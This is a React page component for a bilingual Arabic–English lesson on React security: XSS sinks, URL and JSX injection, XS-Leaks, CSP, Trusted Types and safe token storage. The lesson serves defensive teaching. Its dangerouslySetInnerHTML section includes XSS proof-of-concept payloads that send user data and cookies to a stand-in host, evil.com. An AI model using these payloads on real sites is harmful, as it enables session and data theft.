"use client";
import { LessonShell, Section, Callout, Code, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="react-security">
      <L
        ar={<>
          <Section title="React XSS-by-default? — أو لا؟">
            <p>React يهرب النصوص في JSX تلقائياً، لذا <span className="eng">{`{userInput}`}</span> آمن. هذه الإشاعة تُنسي المطوّرين أن React يفتح فجوات أخرى: <span className="eng">dangerouslySetInnerHTML</span>، URL handlers (<span className="eng">href</span>, <span className="eng">src</span>)، الـ refs، الـ event handlers الديناميكية، JSX injection عبر <span className="eng">React.createElement</span>.</p>
            <Analogy>كباب أمان مزدوج. الإطار يحميك من نسيان قفله، لكن لو فتحته يدوياً (dangerouslySetInnerHTML) فأنت لوحدك. كثيرون يفتحون الباب لأن "الإطار آمن دائماً".</Analogy>
            <Callout kind="danger" title="تذكير">
              الأمثلة لتعليم استغلال DOM/XSS في تطبيقاتك. لا تطبّقها على مواقع لا تملكها.
            </Callout>
          </Section>

          <Section title="dangerouslySetInnerHTML — الباب الكبير">
            <Code lang="jsx">{`// خطر — markdown-to-HTML بدون sanitize
function Comment({ markdown }) {
  const html = markdownToHtml(markdown);
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// PoC في markdown
[click me](javascript:fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://evil.com',{method:'POST',body:JSON.stringify(d)})))

// أو HTML inline
<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">

// الإصلاح — DOMPurify دائماً
import DOMPurify from 'isomorphic-dompurify';
const safe = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p','br','b','i','em','strong','a','ul','ol','li','code','pre'],
  ALLOWED_ATTR: ['href','title'],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\\-]+(?:[^a-z+.\\-:]|$))/i,
});
return <div dangerouslySetInnerHTML={{ __html: safe }} />;`}</Code>
          </Section>

          <Section title="URL Injection — href/src في React">
            <Code lang="jsx">{`// خطر — link مفتوح
<a href={userUrl}>click</a>

// PoC
userUrl = "javascript:alert(1)"
userUrl = "data:text/html,<script>alert(1)</script>"

// الإصلاح — فحص protocol
function safeUrl(u) {
  try {
    const parsed = new URL(u, location.origin);
    if (!['http:','https:','mailto:'].includes(parsed.protocol)) return '#';
    return parsed.toString();
  } catch { return '#'; }
}

<a href={safeUrl(userUrl)} rel="noopener noreferrer" target="_blank">click</a>
// + rel="noopener" دائماً مع target="_blank"
// لمنع window.opener tabnabbing`}</Code>
          </Section>

          <Section title="JSX Injection — حالات نادرة لكن حقيقية">
            <Code lang="jsx">{`// خطر — element type ديناميكي
function Dynamic({ tag, children }) {
  const Tag = tag;
  return <Tag>{children}</Tag>;
}

<Dynamic tag={userTag}>x</Dynamic>
// لو tag = "iframe" مع children فيها src → embedded iframe

// أخطر — props spread من user
<Component {...userProps} />
// userProps = {dangerouslySetInnerHTML: {__html: '<img src=x onerror=...>'}}

// الإصلاح — allowlist للـ tags + لا تنشر user props مباشرة
const ALLOWED_TAGS = ['p','span','div','section','article'];
const Tag = ALLOWED_TAGS.includes(userTag) ? userTag : 'span';`}</Code>
          </Section>

          <Section title="Refs و DOM escapes">
            <p>أحياناً تحتاج DOM API مباشرة. كل استخدام لـ <span className="eng">.innerHTML</span> أو <span className="eng">document.write</span> أو <span className="eng">eval</span> داخل useEffect يفقد حماية React.</p>
            <Code lang="jsx">{`// خطر
function Editor({ html }) {
  const ref = useRef(null);
  useEffect(() => {
    if (ref.current) ref.current.innerHTML = html;   // XSS
  }, [html]);
  return <div ref={ref} />;
}

// آمن — DOMPurify أو textContent
useEffect(() => {
  if (ref.current) ref.current.innerHTML = DOMPurify.sanitize(html);
}, [html]);

// أو لـ النص فقط
ref.current.textContent = userText;   // آمن`}</Code>
          </Section>

          <Section title="Hydration Mismatch كـ Oracle">
            <p>SSR + CSR mismatch ينتج تحذيراً، لكنه يكشف <b>هل القيمة موجودة على الخادم؟</b>. مهاجم يستخدم هذا كـ CSRF-like oracle.</p>
            <Code lang="jsx">{`// مثال: AB test مرتبط بـ user
function Hero() {
  const variant = useABTest();   // يستخدم cookie
  return <div data-variant={variant}>{variant === 'A' ? 'Hi A' : 'Hi B'}</div>;
}

// مهاجم يضع iframe لـ /, ثم يقرأ console errors عبر postMessage abuse
// أو يُولّد differences في DOM يقرأها

// الإصلاح — لا تُنشئ DOM مختلف بناءً على per-user data في SSR
// استخدم useEffect للتحديث post-hydration:
const [variant, setVariant] = useState('A');
useEffect(() => setVariant(getVariant()), []);`}</Code>
          </Section>

          <Section title="State Management — Redux / Zustand pitfalls">
            <ul>
              <li><b>Storing tokens في localStorage</b> — أي XSS = سرقة فورية. استخدم <span className="eng">httpOnly cookies</span>.</li>
              <li><b>Persisted state</b> (redux-persist) — افحص محتوى المستعاد. مهاجم بـ XSS يكتب state خبيث ثم يبقى.</li>
              <li><b>Reducer trust</b> — Reducer يفترض actions موثوقة. لو هناك middleware يقبل actions من user input (rare), prototype pollution ممكن.</li>
              <li><b>Devtools في production</b> — Redux DevTools يجب أن يكون <span className="eng">{`process.env.NODE_ENV === 'development'`}</span> فقط.</li>
            </ul>
          </Section>

          <Section title="CSP و Trusted Types — التحصين الحقيقي">
            <p>حتى لو نسيت DOMPurify مرة، CSP صحيح يقتل XSS قبل أن ينطلق.</p>
            <Code lang="text">{`# Strict CSP for React
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{rand}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';        ← React inline styles
  img-src 'self' data: https:;
  connect-src 'self' https://api.target.gov;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  require-trusted-types-for 'script';
  trusted-types default;`}</Code>
            <Code lang="javascript">{`// Trusted Types — Chrome، Edge
// يمنع innerHTML = string؛ يقبل فقط TrustedHTML

if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy('default', {
    createHTML: (s) => DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: true }),
  });
  el.innerHTML = policy.createHTML(dangerous);
}

// React 18+ يدعم Trusted Types؛ تأكد أن مكتباتك (markdown, charting) تدعمها
// عبر setting compatible policy`}</Code>
          </Section>

          <Section title="Supply chain — npm + CDN risks">
            <ul>
              <li><b>compromised dependencies</b> — نفس قصة Node. حدّث react, react-dom, مكتباتك.</li>
              <li><b>CDN scripts</b> (analytics, A/B) — بدون <span className="eng">integrity</span> SRI تكسر AppSec كاملة.</li>
              <li><b>Browser extension supply chain</b> — لا تثق بأي شيء على client.</li>
            </ul>
            <Code lang="html">{`<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"></script>`}</Code>
          </Section>

          <Section title="XS-Leaks — تسريبات عبر الحدود">
            <p>حتى مع SOP و CSP، browser side-channels تكشف معلومات. مهاجم في موقع آخر يُحمّل تطبيقك في iframe / window و يقيس:</p>
            <ul>
              <li><b>Frame counting</b> — كم iframe لـ <span className="eng">target.com/profile</span>؟ يكشف عدد الـ widgets per state.</li>
              <li><b>Window.length</b> — قبل/بعد login.</li>
              <li><b>Cache timing</b> — هل المورد cached؟ → user logged in.</li>
              <li><b>postMessage leaks</b> — listener على <span className="eng">"*"</span>.</li>
              <li><b>Navigation timing</b> — كم استغرق تحميل /admin؟ → admin أم لا.</li>
            </ul>
            <Callout kind="good" title="الدفاع">
              <ul>
                <li><span className="eng">Cross-Origin-Opener-Policy: same-origin</span></li>
                <li><span className="eng">Cross-Origin-Embedder-Policy: require-corp</span></li>
                <li><span className="eng">Cross-Origin-Resource-Policy: same-site</span></li>
                <li><span className="eng">X-Frame-Options: DENY</span> (أو CSP frame-ancestors).</li>
                <li>postMessage: قارن <span className="eng">event.origin</span> بقائمة صريحة.</li>
                <li>SameSite=strict cookies تمنع كثيراً من تقاطع المواقع.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="React-specific CVE highlights">
            <ul>
              <li><b>CVE-2018-6341 (react-dom)</b> — XSS عبر attributes في server renderer قديم.</li>
              <li><b>react-router</b> CVE متعدد — open redirect عبر <span className="eng">basename</span>.</li>
              <li><b>next/router</b> historical — open redirect.</li>
              <li><b>Material-UI / antd / chakra</b> — sanitization مفقود في tooltip/popover history.</li>
              <li><b>react-markdown</b> — في الإصدارات القديمة قبل v6 كان يستخدم raw HTML افتراضياً. v6+ آمن لكن لا يزال يحتاج config صحيح.</li>
            </ul>
          </Section>

          <Section title="Authentication patterns — أين تخفق React apps">
            <Code lang="jsx">{`// خطأ شائع — token في localStorage
localStorage.setItem('token', jwt);
fetch('/api', { headers: { Authorization: 'Bearer ' + jwt } });

// أي XSS = سرقة token → session takeover

// الأفضل — httpOnly cookie + CSRF token
// خادم: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
// client: لا يلمس الكوكي
fetch('/api', { credentials: 'include', headers: { 'X-CSRF-Token': csrfToken } });

// لـ SPA + token-based — استخدم BFF (Backend for Frontend) pattern
// Cookie ↔ BFF ↔ Auth Server (token تبقى على الـ BFF)`}</Code>
          </Section>

          <Section title="ممارسات مراجعة كود React">
            <ol>
              <li>ابحث عن <span className="eng">dangerouslySetInnerHTML</span> — كل instance يحتاج justification + DOMPurify.</li>
              <li>ابحث عن <span className="eng">.innerHTML</span>، <span className="eng">document.write</span>، <span className="eng">eval</span>، <span className="eng">new Function</span>.</li>
              <li>افحص كل <span className="eng">href</span> ديناميكي — هل يفلتر <span className="eng">javascript:</span>؟</li>
              <li>افحص كل <span className="eng">target="_blank"</span> — هل يحوي <span className="eng">rel="noopener"</span>؟</li>
              <li>افحص كل postMessage — هل يفحص origin؟</li>
              <li>افحص localStorage — أي tokens / PII؟ يجب أن لا يكون.</li>
              <li>افحص env leaks — <span className="eng">REACT_APP_</span> / <span className="eng">VITE_</span> تظهر في bundle.</li>
              <li>افحص الـ redirects — هل يمنع <span className="eng">//evil.com</span>؟</li>
            </ol>
            <Callout kind="info" title="أدوات">
              ESLint + <span className="eng">eslint-plugin-react</span>, <span className="eng">eslint-plugin-jsx-a11y</span>, <span className="eng">eslint-plugin-security</span>. Semgrep <span className="eng">p/react</span>. Dependabot. Snyk.
            </Callout>
          </Section>
        </>}
        en={<>
          <Section title="React: XSS-by-default? Or not?">
            <p>React escapes strings in JSX, so <span className="eng">{`{userInput}`}</span> is safe. That reputation lulls developers into forgetting React opens other holes: <span className="eng">dangerouslySetInnerHTML</span>, URL handlers (<span className="eng">href</span>, <span className="eng">src</span>), refs, dynamic event handlers, JSX injection via <span className="eng">React.createElement</span>.</p>
            <Analogy>A self-locking front door. The frame keeps you safe if you don't unlock it manually — but dangerouslySetInnerHTML is the manual unlock. Many open the door because "the framework is always safe".</Analogy>
            <Callout kind="danger" title="Reminder">
              These examples teach exploitation in your own apps. Don't run them against sites you don't own.
            </Callout>
          </Section>

          <Section title="dangerouslySetInnerHTML — the wide door">
            <Code lang="jsx">{`// Vulnerable — markdown to HTML without sanitization
function Comment({ markdown }) {
  const html = markdownToHtml(markdown);
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// Markdown PoC
[click me](javascript:fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://evil.com',{method:'POST',body:JSON.stringify(d)})))

// Or inline HTML
<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">

// Fix — DOMPurify always
import DOMPurify from 'isomorphic-dompurify';
const safe = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p','br','b','i','em','strong','a','ul','ol','li','code','pre'],
  ALLOWED_ATTR: ['href','title'],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\\-]+(?:[^a-z+.\\-:]|$))/i,
});
return <div dangerouslySetInnerHTML={{ __html: safe }} />;`}</Code>
          </Section>

          <Section title="URL injection — href/src in React">
            <Code lang="jsx">{`// Vulnerable — open link
<a href={userUrl}>click</a>

// PoC
userUrl = "javascript:alert(1)"
userUrl = "data:text/html,<script>alert(1)</script>"

// Fix — protocol check
function safeUrl(u) {
  try {
    const parsed = new URL(u, location.origin);
    if (!['http:','https:','mailto:'].includes(parsed.protocol)) return '#';
    return parsed.toString();
  } catch { return '#'; }
}

<a href={safeUrl(userUrl)} rel="noopener noreferrer" target="_blank">click</a>
// + rel="noopener" always with target="_blank"
// to block window.opener tabnabbing`}</Code>
          </Section>

          <Section title="JSX injection — rare but real">
            <Code lang="jsx">{`// Vulnerable — dynamic element type
function Dynamic({ tag, children }) {
  const Tag = tag;
  return <Tag>{children}</Tag>;
}

<Dynamic tag={userTag}>x</Dynamic>
// If tag = "iframe" with src in children → embedded iframe

// Worse — spreading user-controlled props
<Component {...userProps} />
// userProps = {dangerouslySetInnerHTML: {__html: '<img src=x onerror=...>'}}

// Fix — tag allowlist + don't spread user props directly
const ALLOWED_TAGS = ['p','span','div','section','article'];
const Tag = ALLOWED_TAGS.includes(userTag) ? userTag : 'span';`}</Code>
          </Section>

          <Section title="Refs and DOM escapes">
            <p>Sometimes you need direct DOM API. Any <span className="eng">.innerHTML</span>, <span className="eng">document.write</span>, or <span className="eng">eval</span> inside useEffect drops React's protection.</p>
            <Code lang="jsx">{`// Vulnerable
function Editor({ html }) {
  const ref = useRef(null);
  useEffect(() => {
    if (ref.current) ref.current.innerHTML = html;   // XSS
  }, [html]);
  return <div ref={ref} />;
}

// Safe — DOMPurify or textContent
useEffect(() => {
  if (ref.current) ref.current.innerHTML = DOMPurify.sanitize(html);
}, [html]);

// Or for plain text
ref.current.textContent = userText;   // safe`}</Code>
          </Section>

          <Section title="Hydration mismatch as oracle">
            <p>SSR ↔ CSR mismatch produces a warning, but it leaks <b>does the value exist on the server?</b>. Attackers use this as a CSRF-like oracle.</p>
            <Code lang="jsx">{`// Example: AB test tied to the user
function Hero() {
  const variant = useABTest();   // reads a cookie
  return <div data-variant={variant}>{variant === 'A' ? 'Hi A' : 'Hi B'}</div>;
}

// Attacker iframes / popups your site, observes hydration warnings or DOM diff
// to learn the variant — leakage of authenticated state

// Fix — don't render user-specific DOM in SSR; update post-hydration
const [variant, setVariant] = useState('A');
useEffect(() => setVariant(getVariant()), []);`}</Code>
          </Section>

          <Section title="State management — Redux / Zustand pitfalls">
            <ul>
              <li><b>Tokens in localStorage</b> — any XSS = instant theft. Use <span className="eng">httpOnly cookies</span>.</li>
              <li><b>Persisted state</b> (redux-persist) — validate restored content. An XSS attacker writes hostile state that survives.</li>
              <li><b>Reducer trust</b> — reducers assume trusted actions. If a middleware accepts actions from user input (rare), prototype pollution becomes possible.</li>
              <li><b>Devtools in production</b> — Redux DevTools should be <span className="eng">{`process.env.NODE_ENV === 'development'`}</span> only.</li>
            </ul>
          </Section>

          <Section title="CSP and Trusted Types — the real hardening">
            <p>Even if DOMPurify is missed once, a strict CSP kills XSS before execution.</p>
            <Code lang="text">{`# Strict CSP for React
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{rand}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';        ← React inline styles
  img-src 'self' data: https:;
  connect-src 'self' https://api.target.gov;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  require-trusted-types-for 'script';
  trusted-types default;`}</Code>
            <Code lang="javascript">{`// Trusted Types — Chrome / Edge
// blocks innerHTML = string; only TrustedHTML allowed

if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy('default', {
    createHTML: (s) => DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: true }),
  });
  el.innerHTML = policy.createHTML(dangerous);
}

// React 18+ supports Trusted Types; ensure your libs (markdown, charting)
// register compatible policies`}</Code>
          </Section>

          <Section title="Supply chain — npm + CDN risk">
            <ul>
              <li><b>Compromised dependencies</b> — same as Node.js. Update react, react-dom, all libs.</li>
              <li><b>CDN scripts</b> (analytics, A/B) — without <span className="eng">integrity</span> SRI they break the entire app's threat model.</li>
              <li><b>Browser extension supply chain</b> — never trust client environment.</li>
            </ul>
            <Code lang="html">{`<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"></script>`}</Code>
          </Section>

          <Section title="XS-Leaks — cross-origin side channels">
            <p>Even with SOP and CSP, browser side-channels leak data. An attacker on another site loads your app in an iframe/window and measures:</p>
            <ul>
              <li><b>Frame counting</b> — how many iframes does <span className="eng">target.com/profile</span> render? Reveals widget count per state.</li>
              <li><b>window.length</b> — before/after login.</li>
              <li><b>Cache timing</b> — is the resource cached? → user is logged in.</li>
              <li><b>postMessage leaks</b> — listener on <span className="eng">"*"</span>.</li>
              <li><b>Navigation timing</b> — how long does /admin take? → admin or not.</li>
            </ul>
            <Callout kind="good" title="Defense">
              <ul>
                <li><span className="eng">Cross-Origin-Opener-Policy: same-origin</span></li>
                <li><span className="eng">Cross-Origin-Embedder-Policy: require-corp</span></li>
                <li><span className="eng">Cross-Origin-Resource-Policy: same-site</span></li>
                <li><span className="eng">X-Frame-Options: DENY</span> (or CSP frame-ancestors).</li>
                <li>postMessage: validate <span className="eng">event.origin</span> against an explicit list.</li>
                <li>SameSite=strict cookies prevent many cross-site cases.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="React-specific CVE highlights">
            <ul>
              <li><b>CVE-2018-6341 (react-dom)</b> — XSS via attributes in old server renderer.</li>
              <li><b>react-router</b> multiple CVEs — open redirect via <span className="eng">basename</span>.</li>
              <li><b>next/router</b> historical — open redirect.</li>
              <li><b>Material-UI / antd / chakra</b> — sanitization gaps in tooltip/popover histories.</li>
              <li><b>react-markdown</b> — pre-v6 used raw HTML by default. v6+ is safe but still needs correct config.</li>
            </ul>
          </Section>

          <Section title="Authentication patterns — where React apps fail">
            <Code lang="jsx">{`// Common mistake — token in localStorage
localStorage.setItem('token', jwt);
fetch('/api', { headers: { Authorization: 'Bearer ' + jwt } });

// Any XSS = token theft → session takeover

// Better — httpOnly cookie + CSRF token
// Server: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax
// Client never touches the cookie
fetch('/api', { credentials: 'include', headers: { 'X-CSRF-Token': csrfToken } });

// For SPA + token-based — use the BFF (Backend for Frontend) pattern
// Cookie ↔ BFF ↔ Auth Server (token stays on the BFF)`}</Code>
          </Section>

          <Section title="React code review checklist">
            <ol>
              <li>Find <span className="eng">dangerouslySetInnerHTML</span> — every instance needs justification + DOMPurify.</li>
              <li>Find <span className="eng">.innerHTML</span>, <span className="eng">document.write</span>, <span className="eng">eval</span>, <span className="eng">new Function</span>.</li>
              <li>Inspect every dynamic <span className="eng">href</span> — is <span className="eng">javascript:</span> filtered?</li>
              <li>Inspect every <span className="eng">target="_blank"</span> — does it carry <span className="eng">rel="noopener"</span>?</li>
              <li>Inspect every postMessage — origin checked?</li>
              <li>Inspect localStorage — any tokens / PII? There shouldn't be.</li>
              <li>Inspect env leaks — <span className="eng">REACT_APP_</span> / <span className="eng">VITE_</span> end up in the bundle.</li>
              <li>Inspect redirects — does it block <span className="eng">//evil.com</span>?</li>
            </ol>
            <Callout kind="info" title="Tooling">
              ESLint + <span className="eng">eslint-plugin-react</span>, <span className="eng">eslint-plugin-jsx-a11y</span>, <span className="eng">eslint-plugin-security</span>. Semgrep <span className="eng">p/react</span>. Dependabot. Snyk.
            </Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
